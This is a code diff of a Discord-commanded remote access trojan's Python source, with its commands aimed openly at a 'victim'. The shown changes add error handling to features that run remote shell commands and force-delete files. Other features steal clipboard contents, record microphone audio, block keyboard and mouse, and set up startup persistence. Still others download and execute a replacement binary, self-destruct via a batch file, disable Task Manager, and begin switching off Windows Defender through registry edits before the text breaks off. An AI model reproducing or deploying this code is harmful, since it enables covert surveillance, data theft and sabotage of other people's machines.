+                    my_embed = discord.Embed(title=f"Command not recognized or no output was obtained", color=0xFF0000)
+                    await ctx.send(embed=my_embed)
+                elif numb > 1990:
+                    temp = (os.getenv('TEMP'))
+                    f1 = open(temp + r"\\output.txt", 'a')
+                    f1.write(out)
+                    f1.close()
+                    file = discord.File(temp + r"\\output.txt", filename="output.txt")
+                    my_embed = discord.Embed(title=f"Command executed", color=0x00FF00)
+                    await ctx.send(embed=my_embed)
+                    await ctx.send(file=file)
+                    os.remove(temp + r"\\output.txt")
+                else:
+                    my_embed = discord.Embed(title=f"Command executed : {out}", color=0x00FF00)
+                    await ctx.send(embed=my_embed)
+            else:
                 my_embed = discord.Embed(title=f"Command not recognized or no output was obtained", color=0xFF0000)
                 await ctx.send(embed=my_embed)
-            elif numb > 1990:
-                temp = (os.getenv('TEMP'))
-                f1 = open(temp + r"\\output.txt", 'a')
-                f1.write(out)
-                f1.close()
-                file = discord.File(temp + r"\\output.txt", filename="output.txt")
-                my_embed = discord.Embed(title=f"Command executed", color=0x00FF00)
-                await ctx.send(embed=my_embed)
-                await ctx.send(file=file)
-                os.remove(temp + r"\\output.txt")
-            else:
-                my_embed = discord.Embed(title=f"Command executed : {out}", color=0x00FF00)
-                await ctx.send(embed=my_embed)
-        else:
-            my_embed = discord.Embed(title=f"Command not recognized or no output was obtained", color=0xFF0000)
+                status = None
+        except Exception as e:
+            my_embed = discord.Embed(title=f"Error occured!\n\n{e}", color=0xFF0000)
             await ctx.send(embed=my_embed)
-            status = None
 
 
 @slash.slash(name="Write", description="Make the user type what ever you want", guild_ids=g)
 async def Write_command(ctx: SlashContext, message: str):
     if ctx.channel.name == channel_name:
-        my_embed = discord.Embed(title=f"Typing. . .", color=0x00FF00)
-        await ctx.send(embed=my_embed)
-        for letter in message:
-            pyautogui.typewrite(letter);sleep(0.0001)
-        my_embed = discord.Embed(title=f"Done typing\n\n{message}", color=0x00FF00)
-        await ctx.send(embed=my_embed)
+        try:
+            my_embed = discord.Embed(title=f"Typing. . .", color=0x00FF00)
+            await ctx.send(embed=my_embed)
+            for letter in message:
+                pyautogui.typewrite(letter);sleep(0.0001)
+            my_embed = discord.Embed(title=f"Done typing\n\n{message}", color=0x00FF00)
+            await ctx.send(embed=my_embed)
+        except Exception as e:
+            my_embed = discord.Embed(title=f"Error occured!\n\n{e}", color=0xFF0000)
+            await ctx.send(embed=my_embed)
 
 
 @slash.slash(name="Shutdown", description="Shuts down the users pc", guild_ids=g)
 async def Shutdown_command(ctx: SlashContext):
     if ctx.channel.name == channel_name:
-        import os
-        uncritproc()
-        os.system("shutdown /p")
-        my_embed = discord.Embed(title=f"Command executed", color=0x00FF00)
-        await ctx.send(embed=my_embed)
+        try:
+            import os
+            uncritproc()
+            os.system("shutdown /p")
+            my_embed = discord.Embed(title=f"Command executed", color=0x00FF00)
+            await ctx.send(embed=my_embed)
+        except Exception as e:
+            my_embed = discord.Embed(title=f"Error occured!\n\n{e}", color=0xFF0000)
+            await ctx.send(embed=my_embed)
 
 
 @slash.slash(name="Restart", description="Restarts the users pc", guild_ids=g)
 async def Restart_command(ctx: SlashContext):
     if ctx.channel.name == channel_name:
-        import os
-        uncritproc()
-        os.system("shutdown /r /t 00")
-        my_embed = discord.Embed(title=f"Command executed", color=0x00FF00)
-        await ctx.send(embed=my_embed)
+        try:
+            import os
+            uncritproc()
+            os.system("shutdown /r /t 00")
+            my_embed = discord.Embed(title=f"Command executed", color=0x00FF00)
+            await ctx.send(embed=my_embed)
+        except Exception as e:
+            my_embed = discord.Embed(title=f"Error occured!\n\n{e}", color=0xFF0000)
+            await ctx.send(embed=my_embed)
 
 
 @slash.slash(name="LogOff", description="Logs the user of", guild_ids=g)
 async def LogOff_command(ctx: SlashContext):
     if ctx.channel.name == channel_name:
-        import os
-        uncritproc()
-        os.system("shutdown /l /f")
-        my_embed = discord.Embed(title=f"Command executed", color=0x00FF00)
-        await ctx.send(embed=my_embed)
+        try:
+            import os
+            uncritproc()
+            os.system("shutdown /l /f")
+            my_embed = discord.Embed(title=f"Command executed", color=0x00FF00)
+            await ctx.send(embed=my_embed)
+        except Exception as e:
+            my_embed = discord.Embed(title=f"Error occured!\n\n{e}", color=0xFF0000)
+            await ctx.send(embed=my_embed)
 
 
 @slash.slash(name="DeleteFile", description="Permanently deletes file on the users pc, just POOF", guild_ids=g)
 async def DeleteFile_command(ctx: SlashContext, filedirectory: str):
     if ctx.channel.name == channel_name:
-        global statue
-        import time
-        import subprocess
-        instruction = (filedirectory)
-        instruction = "del " + '"' + instruction + '"' + " /F"
-        def shell():
-            output = subprocess.run(instruction, stdout=subprocess.PIPE,shell=True, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
-            return output
-        import threading
-        shel = threading.Thread(target=shell)
-        shel._running = True
-        shel.start()
-        time.sleep(1)
-        shel._running = False
-        global statue
-        statue = "ok"
-        if statue:
-            result = str(shell().stdout.decode('CP437'))
-            numb = len(result)
-            if numb > 0:
-                my_embed = discord.Embed(title=f"Error occured", color=0xFF0000)
-                await ctx.send(embed=my_embed)
+        try:
+            global statue
+            import time
+            import subprocess
+            instruction = (filedirectory)
+            instruction = "del " + '"' + instruction + '"' + " /F"
+            def shell():
+                output = subprocess.run(instruction, stdout=subprocess.PIPE,shell=True, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+                return output
+            import threading
+            shel = threading.Thread(target=shell)
+            shel._running = True
+            shel.start()
+            time.sleep(1)
+            shel._running = False
+            global statue
+            statue = "ok"
+            if statue:
+                result = str(shell().stdout.decode('CP437'))
+                numb = len(result)
+                if numb > 0:
+                    my_embed = discord.Embed(title=f"Error occured", color=0xFF0000)
+                    await ctx.send(embed=my_embed)
+                else:
+                    my_embed = discord.Embed(title=f"Command executed", color=0x00FF00)
+                    await ctx.send(embed=my_embed)
             else:
-                my_embed = discord.Embed(title=f"Command executed", color=0x00FF00)
+                my_embed = discord.Embed(title=f"Command not recognized or no output was obtained", color=0xFF0000)
                 await ctx.send(embed=my_embed)
-        else:
-            my_embed = discord.Embed(title=f"Command not recognized or no output was obtained", color=0xFF0000)
+                statue = None
+        except Exception as e:
+            my_embed = discord.Embed(title=f"Error occured!\n\n{e}", color=0xFF0000)
             await ctx.send(embed=my_embed)
-            statue = None
 
 
 @slash.slash(name="BlueScreen", description="Bluescreens the user", guild_ids=g)
@@ -1103,23 +1201,31 @@ async def BlueScreen_command(ctx: SlashContext):
 @slash.slash(name="Clipboard", description="get their current clipboard", guild_ids=g)
 async def Clipboard_command(ctx: SlashContext):
     if ctx.channel.name == channel_name:
-        win32clipboard.OpenClipboard()
-        data = win32clipboard.GetClipboardData()
-        win32clipboard.CloseClipboard()
-        my_embed = discord.Embed(title=f"Their Current Clipboard is:\n{data}", color=0x00FF00)
-        await ctx.send(embed=my_embed)
+        try:
+            win32clipboard.OpenClipboard()
+            data = win32clipboard.GetClipboardData()
+            win32clipboard.CloseClipboard()
+            my_embed = discord.Embed(title=f"Their Current Clipboard is:\n{data}", color=0x00FF00)
+            await ctx.send(embed=my_embed)
+        except Exception as e:
+            my_embed = discord.Embed(title=f"Error occured!\n\n{e}", color=0xFF0000)
+            await ctx.send(embed=my_embed)
 
 
 @slash.slash(name="AdminCheck", description=f"check if Cookies RAT has admin perms", guild_ids=g)
 async def AdminCheck_command(ctx: SlashContext):
     if ctx.channel.name == channel_name:
-        import ctypes
-        is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
-        if is_admin == True:
-            my_embed = discord.Embed(title=f"RAT Has Admin privileges", color=0x00FF00)
-            await ctx.send(embed=my_embed)
-        else:
-            my_embed = discord.Embed(title=f"RAT does not have admin privileges", color=0xFF0000)
+        try:
+            import ctypes
+            is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
+            if is_admin == True:
+                my_embed = discord.Embed(title=f"RAT Has Admin privileges", color=0x00FF00)
+                await ctx.send(embed=my_embed)
+            else:
+                my_embed = discord.Embed(title=f"RAT does not have admin privileges", color=0xFF0000)
+                await ctx.send(embed=my_embed)
+        except Exception as e:
+            my_embed = discord.Embed(title=f"Error occured!\n\n{e}", color=0xFF0000)
             await ctx.send(embed=my_embed)
 
 
@@ -1133,17 +1239,21 @@ async def CritProc_command(ctx: SlashContext):
             except AttributeError:
                 is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
             return is_admin
-        if isAdmin():
-            critproc()
-            my_embed = discord.Embed(title=f"Command executed", color=0x00FF00)
-            await ctx.send(embed=my_embed)
-        else:
-            my_embed = discord.Embed(title=f"Admin privileges required", color=0xFF0000)
+        try:
+            if isAdmin():
+                critproc()
+                my_embed = discord.Embed(title=f"Command executed", color=0x00FF00)
+                await ctx.send(embed=my_embed)
+            else:
+                my_embed = discord.Embed(title=f"Admin privileges required", color=0xFF0000)
+                await ctx.send(embed=my_embed)
+        except Exception as e:
+            my_embed = discord.Embed(title=f"Error occured!\n\n{e}", color=0xFF0000)
             await ctx.send(embed=my_embed)
 
 
 @slash.slash(name="UnCritProc", description=f"Turns off CritProc", guild_ids=g)
-async def CritProc_command(ctx: SlashContext):
+async def UnCritProc_command(ctx: SlashContext):
     if ctx.channel.name == channel_name:
         import ctypes
         def isAdmin():
@@ -1152,70 +1262,90 @@ async def CritProc_command(ctx: SlashContext):
             except AttributeError:
                 is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
             return is_admin
-        if isAdmin():
-            critproc()
-            my_embed = discord.Embed(title=f"Command executed", color=0x00FF00)
-            await ctx.send(embed=my_embed)
-        else:
-            my_embed = discord.Embed(title=f"Admin privileges required", color=0xFF0000)
+        try:
+            if isAdmin():
+                uncritproc()
+                my_embed = discord.Embed(title=f"Command executed", color=0x00FF00)
+                await ctx.send(embed=my_embed)
+            else:
+                my_embed = discord.Embed(title=f"Admin privileges required", color=0xFF0000)
+                await ctx.send(embed=my_embed)
+        except Exception as e:
+            my_embed = discord.Embed(title=f"Error occured!\n\n{e}", color=0xFF0000)
             await ctx.send(embed=my_embed)
 
 
 @slash.slash(name="IdleTime", description=f"check for how long your victim has been idle for", guild_ids=g)
 async def IdleTime_command(ctx: SlashContext):
     if ctx.channel.name == channel_name:
-        class LASTINPUTINFO(ctypes.Structure):
-                _fields_ = [
-                    ('cbSize', ctypes.c_uint),
-                    ('dwTime', ctypes.c_int),
-                ]
+        try:
+            class LASTINPUTINFO(ctypes.Structure):
+                    _fields_ = [
+                        ('cbSize', ctypes.c_uint),
+                        ('dwTime', ctypes.c_int),
+                    ]
 
-        def get_idle_duration():
-            lastInputInfo = LASTINPUTINFO()
-            lastInputInfo.cbSize = ctypes.sizeof(lastInputInfo)
-            if ctypes.windll.user32.GetLastInputInfo(ctypes.byref(lastInputInfo)):
-                millis = ctypes.windll.kernel32.GetTickCount() - lastInputInfo.dwTime
-                return millis / 1000.0
-            else:
-                return 0
-        duration = get_idle_duration()
-        my_embed = discord.Embed(title=f"User idle for {duration:.2f} seconds.", color=0x00FF00)
-        await ctx.send(embed=my_embed)
+            def get_idle_duration():
+                lastInputInfo = LASTINPUTINFO()
+                lastInputInfo.cbSize = ctypes.sizeof(lastInputInfo)
+                if ctypes.windll.user32.GetLastInputInfo(ctypes.byref(lastInputInfo)):
+                    millis = ctypes.windll.kernel32.GetTickCount() - lastInputInfo.dwTime
+                    return millis / 1000.0
+                else:
+                    return 0
+            duration = get_idle_duration()
+            my_embed = discord.Embed(title=f"User idle for {duration:.2f} seconds.", color=0x00FF00)
+            await ctx.send(embed=my_embed)
+        except Exception as e:
+            my_embed = discord.Embed(title=f"Error occured!\n\n{e}", color=0xFF0000)
+            await ctx.send(embed=my_embed)
 
 
 @slash.slash(name="BlockInput", description="Blocks user's keyboard and mouse", guild_ids=g)
 async def BlockInput_command(ctx: SlashContext):
     if ctx.channel.name == channel_name:
-        is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
-        if is_admin == True:
-            ctypes.windll.user32.BlockInput(True)
-            my_embed = discord.Embed(title=f"Blocked {os.getlogin()}'s keyboard and mouse", color=0x00FF00)
-            await ctx.send(embed=my_embed)
-        else:
-            my_embed = discord.Embed(title=f"Admin privileges required", color=0xFF0000)
+        try:
+            is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
+            if is_admin == True:
+                ctypes.windll.user32.BlockInput(True)
+                my_embed = discord.Embed(title=f"Blocked {os.getlogin()}'s keyboard and mouse", color=0x00FF00)
+                await ctx.send(embed=my_embed)
+            else:
+                my_embed = discord.Embed(title=f"Admin privileges required", color=0xFF0000)
+                await ctx.send(embed=my_embed)
+        except Exception as e:
+            my_embed = discord.Embed(title=f"Error occured!\n\n{e}", color=0xFF0000)
             await ctx.send(embed=my_embed)
 
 
 @slash.slash(name="UnblockInput", description="UnBlocks user's keyboard and mouse", guild_ids=g)
 async def UnblockInput_command(ctx: SlashContext):
     if ctx.channel.name == channel_name:
-        is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
-        if is_admin == True:
-            ctypes.windll.user32.BlockInput(False)
-            my_embed = discord.Embed(title=f"Unblocked {os.getlogin()}'s keyboard and mouse", color=0x00FF00)
-            await ctx.send(embed=my_embed)
-        else:
-            my_embed = discord.Embed(title=f"Admin privileges required", color=0xFF0000)
+        try:
+            is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
+            if is_admin == True:
+                ctypes.windll.user32.BlockInput(False)
+                my_embed = discord.Embed(title=f"Unblocked {os.getlogin()}'s keyboard and mouse", color=0x00FF00)
+                await ctx.send(embed=my_embed)
+            else:
+                my_embed = discord.Embed(title=f"Admin privileges required", color=0xFF0000)
+                await ctx.send(embed=my_embed)
+        except Exception as e:
+            my_embed = discord.Embed(title=f"Error occured!\n\n{e}", color=0xFF0000)
             await ctx.send(embed=my_embed)
             
 
 @slash.slash(name="MsgBox", description="make a messagebox popup on their screen with a custom message", guild_ids=g)
 async def MessageBox_command(ctx: SlashContext, message: str):
     if ctx.channel.name == channel_name:
-        import pyautogui
-        my_embed = discord.Embed(title=f"Message box sent with message: {message}", color=0x00FF00)
-        await ctx.send(embed=my_embed)
-        print(pyautogui.alert(f"{message}"))
+        try:
+            import pyautogui
+            my_embed = discord.Embed(title=f"Message box sent with message: {message}", color=0x00FF00)
+            await ctx.send(embed=my_embed)
+            print(pyautogui.alert(f"{message}"))
+        except Exception as e:
+            my_embed = discord.Embed(title=f"Error occured!\n\n{e}", color=0xFF0000)
+            await ctx.send(embed=my_embed)
 
 
 @slash.slash(name="Persistence", description="make rat persist of the victims PC", guild_ids=g)
@@ -1236,58 +1366,67 @@ async def Persistence_command(ctx: SlashContext):
                 my_embed = discord.Embed(title=f"Persistent update created on Agent", color=0x00FF00)
                 await ctx.send(embed=my_embed)
         except Exception as e:
-            my_embed = discord.Embed(title=f"Error while making Agent persistent:\n{e}", color=0xFF0000)
+            my_embed = discord.Embed(title=f"Error occured!\n\n{e}", color=0xFF0000)
             await ctx.send(embed=my_embed)
 
 
 @slash.slash(name="RecordAudio", description="record a 10s audio from the victim mic", guild_ids=g)
 async def RecordAudio_command(ctx: SlashContext):
     if ctx.channel.name == channel_name:
-        import sounddevice as sd
-        from scipy.io.wavfile import write
+        try:
+            import sounddevice as sd
+            from scipy.io.wavfile import write
 
-        temp = (os.getenv("temp") + '\\Audio.wav')
-        fs = 44100  # Sample rate
-        seconds = 10  # Duration of recording
+            temp = (os.getenv("temp") + '\\Audio.wav')
+            fs = 44100  # Sample rate
+            seconds = 10  # Duration of recording
 
-        await ctx.send("Starting recorder. . .")
+            await ctx.send("Starting recorder. . .")
 
-        myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
-        sd.wait()
-        write(temp, fs, myrecording)
-        file = discord.File(temp, filename="Morris.wav")
-        my_embed = discord.Embed(title=f"Successfully recorded audio", color=0x00FF00)
-        await ctx.send(embed=my_embed)
-        await  ctx.send(file=file)
+            myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
+            sd.wait()
+            write(temp, fs, myrecording)
+            file = discord.File(temp, filename="Morris.wav")
+            my_embed = discord.Embed(title=f"Successfully recorded audio", color=0x00FF00)
+            await ctx.send(embed=my_embed)
+            await ctx.send(file=file)
+            os.remove(temp)
+        except Exception as e:
+            my_embed = discord.Embed(title=f"Error occured!\n\n{e}", color=0xFF0000)
+            await ctx.send(embed=my_embed)
 
 
 @slash.slash(name="Startup", description="Add the program to startup", guild_ids=g)
 async def Startup_command(ctx: SlashContext):
     if ctx.channel.name == channel_name:
-        import ctypes
-        import os
-        import sys
-        is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
-        if is_admin == True:  
-            path = sys.argv[0]
-            isexe=False
-            if (sys.argv[0].endswith("exe")):
-                isexe=True
-            if isexe:
-                os.system(fr'copy "{path}" "C:\\Users\\%username%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup" /Y' )
+        try:
+            import ctypes
+            import os
+            import sys
+            is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
+            if is_admin == True:  
+                path = sys.argv[0]
+                isexe=False
+                if (sys.argv[0].endswith("exe")):
+                    isexe=True
+                if isexe:
+                    os.system(fr'copy "{path}" "C:\\Users\\%username%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup" /Y' )
+                else:
+                    os.system(r'copy "{}" "C:\\Users\\%username%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs" /Y'.format(path))
+                    e = r"""
+    Set objShell = WScript.CreateObject("WScript.Shell")
+    objShell.Run "cmd /c cd C:\\Users\\%username%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\ && python {}", 0, True
+    """.format(os.path.basename(sys.argv[0]))
+                    with open(r"C:\\Users\\{}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\startup.vbs".format(os.getenv("USERNAME")), "w") as f:
+                        f.write(e)
+                        f.close()
+                my_embed = discord.Embed(title=f"Successfully added to startup", color=0x00FF00)
+                await ctx.send(embed=my_embed)
             else:
-                os.system(r'copy "{}" "C:\\Users\\%username%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs" /Y'.format(path))
-                e = r"""
-Set objShell = WScript.CreateObject("WScript.Shell")
-objShell.Run "cmd /c cd C:\\Users\\%username%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\ && python {}", 0, True
-""".format(os.path.basename(sys.argv[0]))
-                with open(r"C:\\Users\\{}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\startup.vbs".format(os.getenv("USERNAME")), "w") as f:
-                    f.write(e)
-                    f.close()
-            my_embed = discord.Embed(title=f"Successfully added to startup", color=0x00FF00)
-            await ctx.send(embed=my_embed)
-        else:
-            my_embed = discord.Embed(title=f"Admin privileges required", color=0xFF0000)
+                my_embed = discord.Embed(title=f"Admin privileges required", color=0xFF0000)
+                await ctx.send(embed=my_embed)
+        except Exception as e:
+            my_embed = discord.Embed(title=f"Error occured!\n\n{e}", color=0xFF0000)
             await ctx.send(embed=my_embed)
 
 
@@ -1323,68 +1462,80 @@ async def GrabData_command(ctx: SlashContext, download_link_url: str):
 @slash.slash(name="StartProc", description="Starts process using DIR", guild_ids=g)
 async def StartProc_command(ctx: SlashContext, dirtofile: str):
     if ctx.channel.name == channel_name:
-        os.startfile(dirtofile)
-        my_embed = discord.Embed(title=f"Succesfully started process from DIR {dirtofile}", color=0x00FF00)
-        await ctx.send(embed=my_embed)
+        try:
+            os.startfile(dirtofile)
+            my_embed = discord.Embed(title=f"Succesfully started process from DIR {dirtofile}", color=0x00FF00)
+            await ctx.send(embed=my_embed)
+        except Exception as e:
+            my_embed = discord.Embed(title=f"Error occured!\n\n{e}", color=0xFF0000)
+            await ctx.send(embed=my_embed)
 
 
 @slash.slash(name="SelfDestruct", description="Delete all traces of RAT on users PC", guild_ids=g)
 async def SelfDestruct_command(ctx: SlashContext):
     if ctx.channel.name == channel_name:
-        my_embed = discord.Embed(title=f"Self destructing RAT", color=0x3A3636)
-        await ctx.send(embed=my_embed)
-        import os
-        import sys
-        uncritproc()
-        pid = os.getpid()
-        temp = (os.getenv("temp"))
-        cwd2 = sys.argv[0]
-        ######? Kill running RAT and then delete the file then make the bat file delete itself ######
-        data = f"Killed Rat PID: {pid}\n\nRemoved Rat file"
-        embed = discord.Embed(title="")
-        await ctx.send(embed=embed)
-        my_embed = discord.Embed(title=f"Self Destruct Complete", description=f"{data}", color=0x00FF00)
-        await ctx.send(embed=my_embed)
-        bat = """@echo off\n""" + "taskkill" + r" /F /PID " + str(pid) + "\n" + 'timeout 1 > NUL\n' + "del " + '"' + cwd2 + '"\n' + 'timeout 3 > NUL\n' + r"""start /b "" cmd /c del "%~f0"&exit /b\n"""
-        temp6 = temp + r"\\kill.bat"
-        if os.path.isfile(temp6):
-            os.remove(temp6)
-        f6 = open(temp + r"\\kill.bat", 'w')
-        f6.write(bat)
-        f6.close()
-        os.system(r"start /min %temp%\\kill.bat")
+        try:
+            my_embed = discord.Embed(title=f"Self destructing RAT", color=0x3A3636)
+            await ctx.send(embed=my_embed)
+            import os
+            import sys
+            uncritproc()
+            pid = os.getpid()
+            temp = (os.getenv("temp"))
+            cwd2 = sys.argv[0]
+            ######? Kill running RAT and then delete the file then make the bat file delete itself ######
+            data = f"Killed Rat PID: {pid}\n\nRemoved Rat file"
+            embed = discord.Embed(title="")
+            await ctx.send(embed=embed)
+            my_embed = discord.Embed(title=f"Self Destruct Complete", description=f"{data}", color=0x00FF00)
+            await ctx.send(embed=my_embed)
+            bat = """@echo off\n""" + "taskkill" + r" /F /PID " + str(pid) + "\n" + 'timeout 1 > NUL\n' + "del " + '"' + cwd2 + '"\n' + 'timeout 3 > NUL\n' + r"""start /b "" cmd /c del "%~f0"&exit /b\n"""
+            temp6 = temp + r"\\kill.bat"
+            if os.path.isfile(temp6):
+                os.remove(temp6)
+            f6 = open(temp + r"\\kill.bat", 'w')
+            f6.write(bat)
+            f6.close()
+            os.system(r"start /min %temp%\\kill.bat")
+        except Exception as e:
+            my_embed = discord.Embed(title=f"Error occured!\n\n{e}", color=0xFF0000)
+            await ctx.send(embed=my_embed)
 
 
 @slash.slash(name="Update", description="Replace old RAT version with new version", guild_ids=g)
 async def Update_command(ctx: SlashContext, updated_version_url: str):
     if ctx.channel.name == channel_name:
-        import requests, sys, os
-        uncritproc()
-        cwd = os.getcwd()
-        name = os.path.splitext(os.path.basename(__file__))[0]
-        cwd2 = sys.argv[0]
-        pid = os.getpid()
-        temp = (os.getenv("temp"))
+        try:
+            import requests, sys, os
+            uncritproc()
+            cwd = os.getcwd()
+            name = os.path.splitext(os.path.basename(__file__))[0]
+            cwd2 = sys.argv[0]
+            pid = os.getpid()
+            temp = (os.getenv("temp"))
 
-        my_embed = discord.Embed(title=f"Updating please wait for new session! eta. 30-60 secs", color=0x00FF00)
-        await ctx.send(embed=my_embed)
+            my_embed = discord.Embed(title=f"Updating please wait for new session! eta. 30-60 secs", color=0x00FF00)
+            await ctx.send(embed=my_embed)
 
-        #######? Download File #######
-        url = updated_version_url
-        r = requests.get(f"{url}")
-        with open(f'{cwd}\\${name}.exe', 'wb') as f:
-            f.write(r.content)
-        f.close()
+            #######? Download File #######
+            url = updated_version_url
+            r = requests.get(f"{url}")
+            with open(f'{cwd}\\${name}.exe', 'wb') as f:
+                f.write(r.content)
+            f.close()
 
-        #? Create batch file in temp folder to kill current RAT PID and then delete it after that then run the new rat version 
-        bat = """@echo off\n""" + "taskkill" + r" /F /PID " + str(pid) + "\n" + 'timeout 1 > NUL\n' + "del " + '"' + cwd2 + '"\n' + 'timeout 2 > NUL\n' + f'start "" "{cwd}\\${name}.exe"\n' + r"""start /b "" cmd /c del "%~f0"&exit /b\n"""
-        temp6 = temp + r"\\Update.bat"
-        if os.path.isfile(temp6):
-            os.remove(temp6)
-        with open(temp + r"\\Update.bat", 'w') as f6:
-            f6.write(bat)
-        f6.close()
-        os.system(r"start /min %temp%\\Update.bat")
+            #? Create batch file in temp folder to kill current RAT PID and then delete it after that then run the new rat version 
+            bat = """@echo off\n""" + "taskkill" + r" /F /PID " + str(pid) + "\n" + 'timeout 1 > NUL\n' + "del " + '"' + cwd2 + '"\n' + 'timeout 2 > NUL\n' + f'start "" "{cwd}\\${name}.exe"\n' + r"""start /b "" cmd /c del "%~f0"&exit /b\n"""
+            temp6 = temp + r"\\Update.bat"
+            if os.path.isfile(temp6):
+                os.remove(temp6)
+            with open(temp + r"\\Update.bat", 'w') as f6:
+                f6.write(bat)
+            f6.close()
+            os.system(r"start /min %temp%\\Update.bat")
+        except Exception as e:
+            my_embed = discord.Embed(title=f"Error occured!\n\n{e}", color=0xFF0000)
+            await ctx.send(embed=my_embed)
 
 
 @slash.slash(name="StartWebsite", description="Start website link on users PC", guild_ids=g)
@@ -1408,41 +1559,45 @@ async def StartWebsite_command(ctx: SlashContext, chosen_website: str):
 @slash.slash(name="DisableTaskManager", description="Disable victims task manager", guild_ids=g)
 async def DisableTaskManager_command(ctx: SlashContext):
     if ctx.channel.name == channel_name:
-        import ctypes
-        import os
-        is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
-        if is_admin == True:
-            global statuuusss
-            import time
-            statuuusss = None
-            import subprocess
+        try:
+            import ctypes
             import os
-            instruction = r'reg query "HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies"'
-            def shell():
-                output = subprocess.run(instruction, stdout=subprocess.PIPE,shell=True, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
-                global status
-                statuuusss = "ok"
-                return output
-            import threading
-            shel = threading.Thread(target=shell)
-            shel._running = True
-            shel.start()
-            time.sleep(1)
-            shel._running = False
-            result = str(shell().stdout.decode('CP437'))
-            if len(result) <= 5:
-                import winreg as reg
-                reg.CreateKey(reg.HKEY_CURRENT_USER, r'SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System')
+            is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
+            if is_admin == True:
+                global statuuusss
+                import time
+                statuuusss = None
+                import subprocess
                 import os
-                os.system(r'powershell New-ItemProperty -Path "HKCU:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" -Name "DisableTaskMgr" -Value "1" -Force')
+                instruction = r'reg query "HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies"'
+                def shell():
+                    output = subprocess.run(instruction, stdout=subprocess.PIPE,shell=True, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+                    global status
+                    statuuusss = "ok"
+                    return output
+                import threading
+                shel = threading.Thread(target=shell)
+                shel._running = True
+                shel.start()
+                time.sleep(1)
+                shel._running = False
+                result = str(shell().stdout.decode('CP437'))
+                if len(result) <= 5:
+                    import winreg as reg
+                    reg.CreateKey(reg.HKEY_CURRENT_USER, r'SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System')
+                    import os
+                    os.system(r'powershell New-ItemProperty -Path "HKCU:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" -Name "DisableTaskMgr" -Value "1" -Force')
+                else:
+                    import os
+                    os.system(r'powershell New-ItemProperty -Path "HKCU:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" -Name "DisableTaskMgr" -Value "1" -Force')
+                await ctx.send("")
+                my_embed = discord.Embed(title=f"Successfully disabled victims task manager", color=0x00FF00)
+                await ctx.send(embed=my_embed)
             else:
-                import os
-                os.system(r'powershell New-ItemProperty -Path "HKCU:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" -Name "DisableTaskMgr" -Value "1" -Force')
-            await ctx.send("")
-            my_embed = discord.Embed(title=f"Successfully disabled victims task manager", color=0x00FF00)
-            await ctx.send(embed=my_embed)
-        else:
-            my_embed = discord.Embed(title=f"Admin privileges required", color=0xFF0000)
+                my_embed = discord.Embed(title=f"Admin privileges required", color=0xFF0000)
+                await ctx.send(embed=my_embed)
+        except Exception as e:
+            my_embed = discord.Embed(title=f"Error occured!\n\n{e}", color=0xFF0000)
             await ctx.send(embed=my_embed)
 
 
@@ -1488,129 +1643,141 @@ async def DisableTaskManager_command(ctx: SlashContext):
 @slash.slash(name="DisableAntivirus", description="Disable victims antivirus", guild_ids=g)
 async def DisableAntivirus_command(ctx: SlashContext):
     if ctx.channel.name == channel_name:
-        import ctypes, os, time
-        class disable_fsr():
-            disable = ctypes.windll.kernel32.Wow64DisableWow64FsRedirection
-            revert = ctypes.windll.kernel32.Wow64RevertWow64FsRedirection
-            def __enter__(self):
-                self.old_value = ctypes.c_long()
-                self.success = self.disable(ctypes.byref(self.old_value))
-            def __exit__(self, type, value, traceback):
-                if self.success:
-                    self.revert(self.old_value)
-        my_embed = discord.Embed(title=f"Attempting to disable windows antivirus", color=0x00FF00)
-        await ctx.send(embed=my_embed)
+        try:
+            import ctypes, os, time
+            class disable_fsr():
+                disable = ctypes.windll.kernel32.Wow64DisableWow64FsRedirection
+                revert = ctypes.windll.kernel32.Wow64RevertWow64FsRedirection
+                def __enter__(self):
+                    self.old_value = ctypes.c_long()
+                    self.success = self.disable(ctypes.byref(self.old_value))
+                def __exit__(self, type, value, traceback):
+                    if self.success:
+                        self.revert(self.old_value)
+            my_embed = discord.Embed(title=f"Attempting to disable windows antivirus", color=0x00FF00)
+            await ctx.send(embed=my_embed)
 
-        ###### CREATE BATCH FILE ######
-        temp = (os.getenv("temp"))
-        bat = """
-reg delete "HKLM\Software\Policies\Microsoft\Windows Defender" /f
-reg add "HKLM\Software\Policies\Microsoft\Windows Defender" /v "DisableAntiSpyware" /t REG_DWORD /d "1" /f
